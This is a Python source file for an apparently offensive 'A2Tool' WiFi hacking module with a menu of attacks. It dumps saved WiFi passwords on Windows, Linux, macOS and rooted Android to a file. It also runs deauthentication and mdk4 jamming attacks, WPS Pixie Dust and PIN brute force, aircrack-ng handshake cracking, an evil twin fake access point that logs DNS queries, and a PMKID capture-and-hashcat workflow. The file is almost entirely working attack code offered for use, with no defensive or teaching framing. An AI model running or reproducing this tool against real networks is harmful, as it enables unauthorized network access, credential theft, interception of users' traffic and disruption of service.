#!/usr/bin/env python3
# ============================================================
#  A2Tool - WiFi Hacking & Password Recovery Module
#  Works on: Windows / Linux / macOS / Android (Termux)
# ============================================================

import os, sys, time, re, subprocess, json, platform, threading
from colorama import Fore, Style, init
init(autoreset=True)

R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
M = Fore.MAGENTA
C = Fore.CYAN
W = Fore.WHITE
RS = Style.RESET_ALL

OS_NAME = platform.system().lower()
IS_WINDOWS = OS_NAME == 'windows'
IS_LINUX   = OS_NAME == 'linux'
IS_MACOS   = OS_NAME == 'darwin'
IS_ANDROID = 'android' in platform.platform().lower() or 'termux' in os.environ.get('PREFIX', '')

# ────────────────────────────────────────────────────────
# WiFi Password Recovery - Windows
# ────────────────────────────────────────────────────────
def wifi_recover_windows():
    """Recover all saved WiFi passwords on Windows using netsh."""
    print(f"\n{C}[*] Scanning for saved WiFi profiles (Windows)...{RS}\n")
    try:
        # Get all profiles
        output = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'profiles'],
            shell=True, stderr=subprocess.STDOUT, timeout=30
        ).decode('utf-8', errors='ignore')

        profiles = re.findall(r'All User Profile\s+:\s+(.+)', output)
        if not profiles:
            print(f"{Y}[!] No saved WiFi profiles found.{RS}")
            return

        results = []
        for profile in profiles:
            profile = profile.strip()
            try:
                detail = subprocess.check_output(
                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                    shell=True, stderr=subprocess.STDOUT, timeout=15
                ).decode('utf-8', errors='ignore')

                pwd_match = re.search(r'Key Content\s+:\s+(.+)', detail)
                password = pwd_match.group(1).strip() if pwd_match else '[No Password / Open Network]'
                results.append((profile, password))

                color = G if password and 'No Password' not in password else Y
                print(f"  {color}[+] SSID: {W}{profile}{RS}")
                print(f"  {color}    Password: {W}{password}{RS}\n")
            except:
                continue

        # Save to file
        save_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'wifi_dumps')
        os.makedirs(save_path, exist_ok=True)
        ts = time.strftime('%Y%m%d_%H%M%S')
        outfile = os.path.join(save_path, f'wifi_passwords_{ts}.txt')

        with open(outfile, 'w', encoding='utf-8') as f:
            f.write("A2Tool WiFi Password Dump\n")
            f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 50 + "\n\n")
            for ssid, pwd in results:
                f.write(f"SSID: {ssid}\nPassword: {pwd}\n\n")

        print(f"{G}[+] Saved to: {outfile}{RS}")

    except subprocess.TimeoutExpired:
        print(f"{R}[!] Command timed out. Try running as Administrator.{RS}")
    except subprocess.CalledProcessError as e:
        print(f"{R}[!] Error: {e}{RS}")
    except Exception as e:
        print(f"{R}[!] Unexpected error: {e}{RS}")

# ────────────────────────────────────────────────────────
# WiFi Password Recovery - Linux
# ────────────────────────────────────────────────────────
def wifi_recover_linux():
    """Recover saved WiFi passwords from Linux NetworkManager."""
    print(f"\n{C}[*] Scanning for saved WiFi passwords (Linux)...{RS}\n")

    # Method 1: /etc/NetworkManager/system-connections/
    conn_dir = '/etc/NetworkManager/system-connections/'
    if os.path.isdir(conn_dir) and os.access(conn_dir, os.R_OK):
        try:
            files = os.listdir(conn_dir)
            if not files:
                print(f"{Y}[!] No saved connections found in {conn_dir}{RS}")
            else:
                for fname in files:
                    fpath = os.path.join(conn_dir, fname)
                    if os.path.isfile(fpath):
                        try:
                            with open(fpath, 'r', errors='ignore') as f:
                                content = f.read()
                            psk_match = re.search(r'psk=(.+)', content)
                            ssid_match = re.search(r'ssid=(.+)', content)
                            ssid = ssid_match.group(1).strip() if ssid_match else fname
                            pwd = psk_match.group(1).strip() if psk_match else '[Open/Unknown]'
                            color = G if pwd and 'Unknown' not in pwd else Y
                            print(f"  {color}[+] SSID: {W}{ssid}{RS}")
                            print(f"  {color}    Password: {W}{pwd}{RS}\n")
                        except:
                            pass
        except PermissionError:
            print(f"{Y}[!] Permission denied. Run as root.{RS}")

    # Method 2: nmcli (if available)
    try:
        output = subprocess.check_output(
            ['nmcli', '-f', 'NAME', 'connection', 'show'],
            stderr=subprocess.DEVNULL, timeout=10
        ).decode('utf-8', errors='ignore')

        lines = [l.strip() for l in output.split('\n') if l.strip() and 'NAME' not in l]
        if lines:
            print(f"{C}[*] Trying nmcli method...{RS}\n")
            for conn_name in lines:
                try:
                    sec_out = subprocess.check_output(
                        ['nmcli', '-s', 'connection', 'show', conn_name, '-f', '802-11-wireless-security.psk'],
                        stderr=subprocess.DEVNULL, timeout=10
                    ).decode('utf-8', errors='ignore').strip()
                    if sec_out and sec_out != '802-11-wireless-security.psk':
                        print(f"  {G}[+] {W}{conn_name}{RS} -> {G}{sec_out}{RS}")
                except:
                    pass
    except FileNotFoundError:
        pass
    except Exception:
        pass

# ────────────────────────────────────────────────────────
# WiFi Password Recovery - macOS
# ────────────────────────────────────────────────────────
def wifi_recover_macos():
    """Recover saved WiFi passwords on macOS using security command."""
    print(f"\n{C}[*] Scanning for saved WiFi passwords (macOS)...{RS}\n")
    try:
        # Get list of known networks
        output = subprocess.check_output(
            ['/usr/sbin/networksetup', '-listallhardwareports'],
            stderr=subprocess.DEVNULL, timeout=15
        ).decode('utf-8', errors='ignore')

        # Try getting current SSID
        try:
            ssid_out = subprocess.check_output(
                ['/sbin/ifconfig', 'en0'],
                stderr=subprocess.DEVNULL, timeout=10
            ).decode('utf-8', errors='ignore')
            print(f"{C}[*] Interface info retrieved.{RS}")
        except:
            pass

        # Use security to find generic passwords
        try:
            keychain_out = subprocess.check_output(
                ['security', 'find-generic-password', '-wa', 'AirPort'],
                stderr=subprocess.DEVNULL, timeout=15
            ).decode('utf-8', errors='ignore')
            print(f"{G}[+] WiFi passwords retrieved from Keychain.{RS}")
            print(f"{Y}    {keychain_out}{RS}")
        except:
            print(f"{Y}[!] Could not access Keychain. Try running without SIP.{RS}")

        # Alternative: try known networks
        try:
            preferred = subprocess.check_output(
                ['/usr/sbin/networksetup', '-listpreferredwirelessnetworks', 'en0'],
                stderr=subprocess.DEVNULL, timeout=15
            ).decode('utf-8', errors='ignore')
            print(f"\n{C}[*] Preferred Networks:{RS}")
            print(f"    {preferred}{RS}")

            for line in preferred.split('\n')[1:]:
                ssid = line.strip()
                if ssid:
                    try:
                        pwd = subprocess.check_output(
                            ['security', 'find-generic-password', '-wa', ssid],
                            stderr=subprocess.DEVNULL, timeout=10
                        ).decode('utf-8', errors='ignore').strip()
                        print(f"  {G}[+] {W}{ssid}{RS} -> {G}{pwd}{RS}")
                    except:
                        print(f"  {Y}[!] {W}{ssid}{RS} -> {Y}[Access Denied]{RS}")
        except:
            print(f"{Y}[!] Could not list preferred networks.{RS}")

    except Exception as e:
        print(f"{R}[!] Error: {e}{RS}")

# ────────────────────────────────────────────────────────
# WiFi Password Recovery - Android (Termux)
# ────────────────────────────────────────────────────────
def wifi_recover_android():
    """Recover WiFi passwords on Android (requires root)."""
    print(f"\n{C}[*] Scanning for saved WiFi passwords (Android)...{RS}\n")

    # Check root
    root_check = subprocess.run(['which', 'su'], capture_output=True, text=True, timeout=5)
    has_root = root_check.returncode == 0

    if not has_root:
        print(f"{Y}[!] Root not detected. Attempting non-root methods...{RS}")

    # Method 1: /data/misc/wifi/wpa_supplicant.conf (requires root)
    if has_root:
        paths = [
            '/data/misc/wifi/wpa_supplicant.conf',
            '/data/misc/wifi/WifiConfigStore.xml',
        ]
        for wpa_path in paths:
            try:
                output = subprocess.check_output(
                    ['su', '-c', f'cat {wpa_path}'],
                    stderr=subprocess.DEVNULL, timeout=10
                ).decode('utf-8', errors='ignore')

                if 'network=' in output or 'ssid' in output.lower():
                    print(f"{G}[+] Found WiFi config at: {wpa_path}{RS}\n")
                    # Parse networks
                    networks = re.findall(r'ssid="([^"]+)"', output)
                    passwords = re.findall(r'psk="([^"]+)"', output)
                    for i, ssid in enumerate(networks):
                        pwd = passwords[i] if i < len(passwords) else '[Open/Unknown]'
                        print(f"  {G}[+] SSID: {W}{ssid}{RS}")
                        print(f"  {G}    Password: {W}{pwd}{RS}\n")
                    return
            except:
                continue

    # Method 2: Try reading from Termux private storage
    try:
        if not has_root:
            import subprocess as sp
            # Try using cmd wifi (Android 10+)
            result = sp.run(['cmd', 'wifi', 'list-networks'], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"{G}[+] WiFi networks:{RS}\n{result.stdout}{RS}")
    except:
        pass

    print(f"{Y}[!] Could not retrieve WiFi passwords.{RS}")
    print(f"{Y}[!] On Android 10+, use: cmd wifi list-networks{RS}")
    print(f"{Y}[!] On rooted devices, check /data/misc/wifi/wpa_supplicant.conf{RS}")

# ────────────────────────────────────────────────────────
# Universal WiFi Scanner (all platforms)
# ────────────────────────────────────────────────────────
def wifi_scan_networks():
    """Scan for nearby WiFi networks."""
    print(f"\n{C}[*] Scanning for nearby WiFi networks...{RS}\n")

    if IS_WINDOWS:
        try:
            output = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
                shell=True, timeout=30
            ).decode('utf-8', errors='ignore')
            print(output)
        except Exception as e:
            print(f"{R}[!] Error: {e}{RS}")
    elif IS_LINUX:
        try:
            # Check if nmcli is available
            output = subprocess.check_output(
                ['nmcli', 'dev', 'wifi', 'list'],
                stderr=subprocess.DEVNULL, timeout=30
            ).decode('utf-8', errors='ignore')
            print(output)
        except:
            try:
                output = subprocess.check_output(
                    ['iwlist', 'scan', '2>/dev/null'],
                    shell=True, timeout=30
                ).decode('utf-8', errors='ignore')
                # Parse and display
                for line in output.split('\n'):
                    if 'ESSID' in line or 'Quality' in line or 'Encryption' in line:
                        print(f"  {C}{line.strip()}{RS}")
            except:
                print(f"{R}[!] No scanning tool found (install nmcli or iwlist){RS}")
    elif IS_MACOS:
        try:
            output = subprocess.check_output(
                ['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '-s'],
                stderr=subprocess.DEVNULL, timeout=30
            ).decode('utf-8', errors='ignore')
            print(output)
        except:
            print(f"{R}[!] airport command not found.{RS}")
    elif IS_ANDROID:
        try:
            output = subprocess.check_output(
                ['cmd', 'wifi', 'list-networks'],
                stderr=subprocess.DEVNULL, timeout=15
            ).decode('utf-8', errors='ignore')
            print(output)
        except:
            print(f"{R}[!] Could not scan. Try: termux-wifi-scaninfo{RS}")
    else:
        print(f"{R}[!] Unsupported platform.{RS}")

# ────────────────────────────────────────────────────────
# WiFi deauth attack (Linux with monitor mode)
# ────────────────────────────────────────────────────────
def wifi_deauth_attack():
    """Perform deauthentication attack (requires aircrack-ng, Linux)."""
    print(f"\n{R}╔═══════════════════════════════════════════════════════╗")
    print(f"║  {Y}WiFi Deauthentication Attack (Deauth){R}              ║")
    print(f"║  {Y}Requires: aircrack-ng, monitor mode, Linux{R}          ║")
    print(f"╚═══════════════════════════════════════════════════════╝{RS}")

    if not IS_LINUX and not IS_ANDROID:
        print(f"{R}[!] Deauth attack requires Linux or Android with monitor mode.{RS}")
        return

    if IS_ANDROID:
        print(f"{Y}[!] On Android, use: aireplay-ng -0 10 -a <BSSID> wlan0{RS}")
        return

    # Check for aircrack-ng
    try:
        subprocess.run(['which', 'aircrack-ng'], check=True, capture_output=True, timeout=5)
    except:
        print(f"{R}[!] aircrack-ng not installed. Install with: sudo apt install aircrack-ng{RS}")
        return

    bssid = input(f"{Y}  Target BSSID (e.g., AA:BB:CC:DD:EE:FF): {RS}").strip()
    iface = input(f"{Y}  Interface (e.g., wlan0mon): {RS}").strip() or 'wlan0mon'
    count = input(f"{Y}  Number of deauth packets (0=infinite): {RS}").strip() or '10'

    print(f"\n{C}[*] Starting deauth attack on {bssid} via {iface}...{RS}")
    cmd = ['aireplay-ng', '-0', count, '-a', bssid, iface]
    print(f"{Y}  Command: {' '.join(cmd)}{RS}")
    print(f"{Y}  Press Ctrl+C to stop.{RS}\n")

    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Attack stopped.{RS}")
    except Exception as e:
        print(f"{R}[!] Error: {e}{RS}")

# ────────────────────────────────────────────────────────
# WiFi WPS Pixie Dust Attack
# ────────────────────────────────────────────────────────
def wifi_wps_attack():
    """WPS Pixie Dust attack using reaver/wash."""
    print(f"\n{R}╔═══════════════════════════════════════════════════════╗")
    print(f"║  {Y}WPS Pixie Dust Attack{R}                               ║")
    print(f"║  {Y}Requires: reaver, wash, monitor mode{R}                ║")
    print(f"╚═══════════════════════════════════════════════════════╝{RS}")

    if not IS_LINUX:
        print(f"{R}[!] WPS attack requires Linux with monitor mode.{RS}")
        return

    print(f"{C}[*] Scanning for WPS-enabled networks...{RS}")
    try:
        subprocess.run(['wash', '--help'], capture_output=True, timeout=5)
    except:
        print(f"{R}[!] reaver/wash not installed. Install with: sudo apt install reaver{RS}")
        return

    print(f"\n{Y}  Recommended workflow:{RS}")
    print(f"  {W}1. sudo wash -i wlan0mon{RS}")
    print(f"  {W}2. sudo reaver -i wlan0mon -b <BSSID> -K{RS}")
    print(f"\n{Y}  Or run automatically? (y/N): {RS}", end='')
    auto = input().strip().lower()
    if auto == 'y':
        iface = input(f"{Y}  Interface (e.g., wlan0mon): {RS}").strip() or 'wlan0mon'
        bssid = input(f"{Y}  Target BSSID: {RS}").strip()
        if bssid:
            cmd = f"sudo reaver -i {iface} -b {bssid} -K"
            print(f"{C}[*] Running: {cmd}{RS}")
            os.system(cmd)

# ────────────────────────────────────────────────────────
# WiFi Password Cracking (Handshake capture + wordlist)
# ────────────────────────────────────────────────────────
def wifi_handshake_crack():
    """Crack WPA/WPA2 handshake with wordlist."""
    print(f"\n{Y}╔═══════════════════════════════════════════════════════╗")
    print(f"║  {W}WPA/WPA2 Handshake Cracker{R}                         {Y}║")
    print(f"╚═══════════════════════════════════════════════════════╝{RS}")

    cap_file = input(f"{Y}  Path to .cap file: {RS}").strip()
    wordlist = input(f"{Y}  Path to wordlist (e.g., rockyou.txt): {RS}").strip()
    bssid = input(f"{Y}  Target BSSID (optional): {RS}").strip()

    if not os.path.isfile(cap_file):
        print(f"{R}[!] Capture file not found!{RS}")
        return
    if not os.path.isfile(wordlist):
        print(f"{R}[!] Wordlist not found!{RS}")
        return

    # Use aircrack-ng
    try:
        if bssid:
            cmd = ['aircrack-ng', '-w', wordlist, '-b', bssid, cap_file]
        else:
            cmd = ['aircrack-ng', '-w', wordlist, cap_file]
        print(f"{C}[*] Running: {' '.join(cmd)}{RS}\n")
        subprocess.run(cmd)
    except FileNotFoundError:
        print(f"{R}[!] aircrack-ng not found. Install it first.{RS}")
    except Exception as e:
        print(f"{R}[!] Error: {e}{RS}")

# ────────────────────────────────────────────────────────
# Fake AP / Evil Twin (Linux)
# ────────────────────────────────────────────────────────
def wifi_evil_twin():
    """Set up an Evil Twin AP (requires hostapd/dnsmasq)."""
    print(f"\n{R}╔═══════════════════════════════════════════════════════╗")
    print(f"║  {Y}Evil Twin / Fake Access Point{R}                       ║")
    print(f"║  {Y}Requires: hostapd, dnsmasq, Linux{R}                   ║")
    print(f"╚═══════════════════════════════════════════════════════╝{RS}")

    if not IS_LINUX:
        print(f"{R}[!] Evil Twin requires Linux.{RS}")
        return

    ssid = input(f"{Y}  Fake SSID name: {RS}").strip() or 'Free WiFi'
    iface = input(f"{Y}  Interface (e.g., wlan0): {RS}").strip() or 'wlan0'
    channel = input(f"{Y}  Channel (default 6): {RS}").strip() or '6'

    # Generate config files
    conf_dir = '/tmp/a2tool_evil_twin'
    os.makedirs(conf_dir, exist_ok=True)

    hostapd_conf = os.path.join(conf_dir, 'hostapd.conf')
    dnsmasq_conf = os.path.join(conf_dir, 'dnsmasq.conf')

    with open(hostapd_conf, 'w') as f:
        f.write(f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
""")

    with open(dnsmasq_conf, 'w') as f:
        f.write(f"""interface={iface}
dhcp-range=192.168.1.2,192.168.1.100,255.255.255.0,24h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
""")

    print(f"\n{G}[+] Config files created at: {conf_dir}{RS}")
    print(f"{Y}  To start, run:{RS}")
    print(f"  {W}sudo hostapd {hostapd_conf}{RS}")
    print(f"  {W}sudo dnsmasq -C {dnsmasq_conf} -d{RS}")
    print(f"  {W}sudo sysctl net.ipv4.ip_forward=1{RS}")
    print(f"\n{Y}  Start now? (y/N): {RS}", end='')
    if input().strip().lower() == 'y':
        print(f"{C}[*] Starting Evil Twin AP...{RS}")
        threading.Thread(target=lambda: os.system(f'sudo hostapd {hostapd_conf}'), daemon=True).start()
        time.sleep(2)
        os.system(f'sudo dnsmasq -C {dnsmasq_conf} -d')

# ────────────────────────────────────────────────────────
# Force WiFi reconnect (Windows)
# ────────────────────────────────────────────────────────
def wifi_force_reconnect():
    """Force reconnect to WiFi (fast password capture)."""
    print(f"\n{C}[*] Forcing WiFi reconnect to capture handshake...{RS}")
    if IS_WINDOWS:
        try:
            # Disconnect
            subprocess.run(['netsh', 'wlan', 'disconnect'], shell=True, timeout=10)
            time.sleep(2)
            # Reconnect
            ssid = input(f"{Y}  SSID to reconnect to: {RS}").strip()
            if ssid:
                subprocess.run(['netsh', 'wlan', 'connect', f'name={ssid}'], shell=True, timeout=10)
                print(f"{G}[+] Reconnecting to {ssid}...{RS}")
                print(f"{Y}[*] Now run a handshake capture tool to grab the 4-way handshake.{RS}")
        except Exception as e:
            print(f"{R}[!] Error: {e}{RS}")
    else:
        print(f"{Y}[!] This feature is mainly for Windows.{RS}")

# ────────────────────────────────────────────────────────
# Auto-Brute Force WiFi PIN (WPS)
# ────────────────────────────────────────────────────────
def wifi_wps_bruteforce():
    """Brute force WPS PIN using bully."""
    print(f"\n{Y}╔═══════════════════════════════════════════════════════╗")
    print(f"║  {W}WPS PIN Bruteforce{R}                                 {Y}║")
    print(f"╚═══════════════════════════════════════════════════════╝{RS}")
    print(f"{C}[*] Using bully - WPS brute force tool{RS}")
    bssid = input(f"{Y}  Target BSSID: {RS}").strip()
    iface = input(f"{Y}  Interface (monitor mode): {RS}").strip() or 'wlan0mon'
    if bssid:
        cmd = f"sudo bully {iface} -b {bssid} -c 1 -L -F"
        print(f"{C}[*] Running: {cmd}{RS}")
        os.system(cmd)

# ────────────────────────────────────────────────────────
# Menu
# ────────────────────────────────────────────────────────
def menu():
    from . import utils
    while True:
        # Use clear from parent
        os.system('cls' if IS_WINDOWS else 'clear')
        print(f"""{C}
  ╔═══════════════════════════════════════════════════════╗
  ║  {W}A2Tool - WiFi Hacking & Password Recovery{R}            {C}║
  ╠═══════════════════════════════════════════════════════╣
  ║  {W}[1] {R}Recover Saved WiFi Passwords                     {C}║
  ║  {W}[2] {R}Scan Nearby WiFi Networks                        {C}║
  ║  {W}[3] {R}Deauthentication Attack                         {C}║
  ║  {W}[4] {R}WPS Pixie Dust Attack                           {C}║
  ║  {W}[5] {R}WPA/WPA2 Handshake Cracker                      {C}║
  ║  {W}[6] {R}Evil Twin / Fake AP Setup                       {C}║
  ║  {W}[7] {R}Force WiFi Reconnect (Handshake Capture)        {C}║
  ║  {W}[8] {R}WPS PIN Bruteforce (Bully)                      {C}║
  ║  {W}[9] {R}WiFi Jamming (mdk4)                             {C}║
  ║  {W}[10]{R}PMKID Attack                                    {C}║
  ║  {W}[11]{R}Extract WiFi Passwords (All OS Auto-Detect)     {C}║
  ║  {W}[0] {R}Back to Main Menu                               {C}║
  ╚═══════════════════════════════════════════════════════╝
{RS}""")
        choice = input(f"{Y}  A2Tool[WiFi] » {RS}").strip()

        if choice == '0':
            break
        elif choice == '1':
            if IS_WINDOWS:        wifi_recover_windows()
            elif IS_LINUX:        wifi_recover_linux()
            elif IS_MACOS:        wifi_recover_macos()
            elif IS_ANDROID:      wifi_recover_android()
            else:                 print(f"{R}[!] Unsupported OS.{RS}")
            input(f"\n{Y}[+] Press Enter...{RS}")
        elif choice == '2':
            wifi_scan_networks()
            input(f"\n{Y}[+] Press Enter...{RS}")
        elif choice == '3':
            wifi_deauth_attack()
            input(f"\n{Y}[+] Press Enter...{RS}")
        elif choice == '4':
            wifi_wps_attack()
            input(f"\n{Y}[+] Press Enter...{RS}")
        elif choice == '5':
            wifi_handshake_crack()
            input(f"\n{Y}[+] Press Enter...{RS}")
        elif choice == '6':
            wifi_evil_twin()
            input(f"\n{Y}[+] Press Enter...{RS}")
        elif choice == '7':
            wifi_force_reconnect()
            input(f"\n{Y}[+] Press Enter...{RS}")
        elif choice == '8':
            wifi_wps_bruteforce()
            input(f"\n{Y}[+] Press Enter...{RS}")
        elif choice == '9':
            print(f"{C}[*] WiFi Jamming with mdk4{RS}")
            iface = input(f"{Y}  Interface (monitor mode): {RS}").strip() or 'wlan0mon'
            bssid = input(f"{Y}  Target BSSID (optional): {RS}").strip()
            cmd = f"sudo mdk4 {iface} d" + (f" -b {bssid}" if bssid else "")
            print(f"{C}[*] Running: {cmd}{RS}")
            os.system(cmd)
            input(f"\n{Y}[+] Press Enter...{RS}")
        elif choice == '10':
            print(f"{C}[*] PMKID Attack{RS}")
            print(f"{Y}  Requires: hcxdumptool & hcxpcaptool{RS}")
            iface = input(f"{Y}  Interface (monitor mode): {RS}").strip() or 'wlan0mon'
            cmd = f"sudo hcxdumptool -i {iface} --enable_status=1 -o pmkid_capture.pcapng"
            print(f"{C}[*] Running: {cmd}{RS}")
            print(f"{Y}[*] Then convert: hcxpcaptool -z pmkid.16800 pmkid_capture.pcapng{RS}")
            print(f"{Y}[*] Then crack: hashcat -m 16800 pmkid.16800 wordlist.txt{RS}")
            input(f"\n{Y}[+] Press Enter...{RS}")
        elif choice == '11':
            print(f"\n{C}[*] Auto-detecting platform...{RS}")
            time.sleep(1)
            if IS_WINDOWS:        wifi_recover_windows()
            elif IS_LINUX:        wifi_recover_linux()
            elif IS_MACOS:        wifi_recover_macos()
            elif IS_ANDROID:      wifi_recover_android()
            else:                 print(f"{R}[!] Unsupported OS.{RS}")
            input(f"\n{Y}[+] Press Enter...{RS}")
        else:
            print(f"{R}[!] Invalid choice.{RS}")
            time.sleep(1)

if __name__ == '__main__':
    menu()
